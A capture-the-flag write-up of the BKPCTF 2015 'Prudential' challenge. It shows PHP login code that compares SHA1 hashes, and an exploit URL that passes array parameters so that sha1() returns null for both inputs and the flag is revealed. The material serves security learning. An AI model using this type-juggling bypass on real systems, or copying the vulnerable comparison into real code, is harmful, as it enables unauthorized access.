# Prudential
---
I dont think that sha1 is broken. Prove me wrong. : 25

## Source code

```
<html>
<head>
	<title>level1</title>
    <link rel='stylesheet' href='style.css' type='text/css'>
</head>
<body>

<?php
require 'flag.php';

if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        print 'Your password can not be your name.';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        print '<p class="alert">Invalid password.</p>';
}
?>

<section class="login">
	<div class="title">
		<a href="./index.txt">Level 1</a>
	</div>

	<form method="get">
		<input type="text" required name="name" placeholder="Name"/><br/>
		<input type="text" required name="password" placeholder="Password" /><br/>
		<input type="submit"/>
	</form>
</section>
</body>
</html>

```

## Solution

Because there's no option to find two different strings which will generate equals SHA1 IDs (although theoretically it is possible), we have to find other way to pass login validation.

If we "break" types of parameters passed to script, condition is not executed and 'Flag' displays:

```
http://52.10.107.64:8001/?name[]=a&password[]=b
```

Note: This is sample error output from local script:

> Warning: sha1() expects parameter 1 to be string, array given in (...)ctf/BKPCTF2015/test.php on line 14

> Warning: sha1() expects parameter 1 to be string, array given in (...)ctf/BKPCTF2015/test.php on line 14

> Flag:
